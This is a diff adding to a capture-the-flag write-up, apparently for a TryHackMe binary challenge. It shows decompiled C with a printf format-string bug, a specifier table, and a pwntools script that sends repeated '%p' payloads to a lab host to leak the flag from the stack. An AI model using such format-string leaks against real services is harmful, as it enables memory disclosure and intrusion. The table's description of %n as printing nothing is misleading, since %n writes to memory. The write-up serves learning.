@@ -407,7 +407,86 @@ Enter your THM username to participate in the giveaway: %p %p %p %p %p %p
 Thanks 0x7ffd43b908a0 (nil) (nil) 0x55e71b068380 0x7f3191483b30 0x5b5858587b4d4854 
 ```
 
-It seems to be a format string vulnerability! ([See here for more info](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/))
+It seems to be a format string vulnerability PoC! ([See here for more info](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/))
 
-So I first 
+In order to understand the vulnerability more clearly, we step into the code that is decompiled by IDA.
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char buf[56]; // [rsp+20h] [rbp-40h] BYREF
+  unsigned __int64 v6; // [rsp+58h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setup(argc, argv, envp);
+  banner();
+  puts(&byte_2119);
+  printf("Enter your THM username to participate in the giveaway: ");
+  read(0, buf, 0x32uLL);
+  printf("\nThanks ");
+  printf(buf);
+  return v6 - __readfsqword(0x28u);
+}
+```
+
+Here, the programmer read 0x32 bytes, which is 50 in decimal, and stored it in a buf of 56 bytes. So apparently the BOF doesn't exist. But this line gives a format string vulnerability for us to leak out the flag on the stack.
+
+```c
+printf(buf);
+```
+
+The following is the format specifier table I found on [GeeksforGeeks](https://www.geeksforgeeks.org/format-specifiers-in-c/).
+
+|    Format Specifier    |                Description                 |
+| :--------------------: | :----------------------------------------: |
+|      ***\*%c\****      |            For character type.             |
+|      ***\*%d\****      |          For signed integer type.          |
+|   ***\*%e or %E\****   |     For scientific notation of floats.     |
+|      ***\*%f\****      |              For float type.               |
+|   ***\*%g or %G\****   | For float type with the current precision. |
+|      ***\*%i\****      |               signed integer               |
+|  ***\*%ld or %li\****  |                    Long                    |
+|     ***\*%lf\****      |                   Double                   |
+|     ***\*%Lf\****      |                Long double                 |
+|     ***\*%lu\****      |       Unsigned int or unsigned long        |
+| ***\*%lli or %lld\**** |                 Long long                  |
+|     ***\*%llu\****     |             Unsigned long long             |
+|      ***\*%o\****      |            Octal representation            |
+|      ***\*%p\****      |                  Pointer                   |
+|      ***\*%s\****      |                   String                   |
+|      ***\*%u\****      |                Unsigned int                |
+|   ***\*%x or %X\****   |         Hexadecimal representation         |
+|      ***\*%n\****      |               Prints nothing               |
+|      ***\*%%\****      |             Prints % character             |
+
+And here I used the `%p` to leak the stack out. The following is the exploit.
+
+```python
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+
+r = remote("10.10.87.15", 9006)
+r.recvuntil("giveaway: ")
+r.sendline(b"%p " * 20)  # This is the payload
+r.recvuntil("Thanks ")
+
+leak_items = r.recvall().split()  # Cause we sent the payload seperated by spaces
+
+valid_items = []
+for item in leak_items:
+    try:
+        item = int(item.decode(), 16)  # Change it to decimal to convert it to bytes
+        valid_items.append(
+            long_to_bytes(item)[::-1].decode()
+        )  # Due to the little-endianess
+    except ValueError:
+        pass
+
+flag = "".join(valid_items)
+print(flag)
+```
+
+```txt
+THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}
+```
 
